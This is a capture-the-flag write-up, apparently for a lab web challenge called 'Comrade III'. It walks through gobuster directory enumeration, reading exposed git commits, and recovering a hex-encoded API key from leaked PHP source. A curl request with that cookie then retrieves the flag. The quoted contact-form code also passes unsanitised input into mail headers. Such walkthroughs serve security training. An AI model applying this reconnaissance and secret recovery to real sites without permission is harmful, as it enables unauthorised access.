# COMRADE III

---

> ### Hey Comrade , World War III will begin soon , we need to reveal what was hidden.

<img width="1850" height="682" alt="image" src="https://github.com/user-attachments/assets/f6507ca1-9a5b-400e-b590-3e743e31fdd6" />

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://cdcamxwl32pue3e6mk873o1muw3y0873o8mombwzy-web.cybertalentslabs.com/

```

<img width="1256" height="511" alt="image" src="https://github.com/user-attachments/assets/566b93ec-5f90-44db-84d3-2d5a8eaad4b1" />

<img width="1021" height="702" alt="image" src="https://github.com/user-attachments/assets/de887f49-3614-4a7f-8cad-0aef885f732c" />

## **`api.php`**

```php
<?php
include('./access.php');
include('./index.php');
if($_COOKIE['api_key'] == $apikey) 
echo "Flag: $flag";                                                                                                                                              

```

This means:

-   There's an `access.php` file with `$apikey` and `$flag` variables

-   We need to set a cookie named `api_key` with the correct value

-   Then access `api.php` to get the flag

```
git show 49adf7e  # First commit
git show e332b14  # Second commit
```

<img width="1265" height="627" alt="image" src="https://github.com/user-attachments/assets/4aab9faf-177f-426b-86c2-fb0d4989fcde" />

---

## cat contacat_proccess.php

<img width="1175" height="598" alt="image" src="https://github.com/user-attachments/assets/117850e2-90a0-421f-8127-f2eaa3e609e5" />

```
<?php

    $to = "comrade1995@gmail.com";
    $from = $_REQUEST['email'];
    $name = $_REQUEST['name'];
    $subject = $_REQUEST['subject'];
    $number = $_REQUEST['number'];
    $cmessage = $_REQUEST['message'];

    $headers = "From: $from";
        $headers = "From: " . $from . "\r\n";
        $headers .= "Reply-To: ". $from . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

    $subject = "You have a message from your Bitmap Photography.";

    $logo = 'img/logo.png';
    $link = '#';
        $access = bin2hex('this_is_top_secret');
        $body = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>Express Mail</title></head><body>";
        $body .= "<table style='width: 100%;'>";
        $body .= "<thead style='text-align: center;'><tr><td style='border:none;' colspan='2'>";
        $body .= "<a href='{$link}'></a><br><br>";
        $body .= "</td></tr></thead><tbody><tr>";
        $body .= "<td style='border:none;'><strong>Name:</strong> {$name}</td>";
        $body .= "<td style='border:none;'><strong>Email:</strong> {$from}</td>";
        $body .= "</tr>";
        $body .= "<tr><td style='border:none;'><strong>Subject:</strong> {$csubject}</td></tr>";
        $body .= "<tr><td></td></tr>";
        $body .= "<tr><td colspan='2' style='border:none;'>{$cmessage}</td></tr>";
        $body .= "</tbody></table>";
        $body .= "</body></html>";

    $send = mail($to, $subject, $body, $headers);

?>                                       
```

## so cookie is **`this_is_top_secret`** after convert it to hex

```
746869735f69735f746f705f736563726574
```

```
curl --cookie "api_key=746869735f69735f746f705f736563726574" http://cdcamxwl32pue3e6mk873o1muw3y0873o8mombwzy-web.cybertalentslabs.com/api.php
```

<img width="1351" height="393" alt="image" src="https://github.com/user-attachments/assets/a95c7ad8-47b8-4892-9162-0809b8c8a554" />

```
Flag{g!7_!5_4w350m3_XD!!} 
```

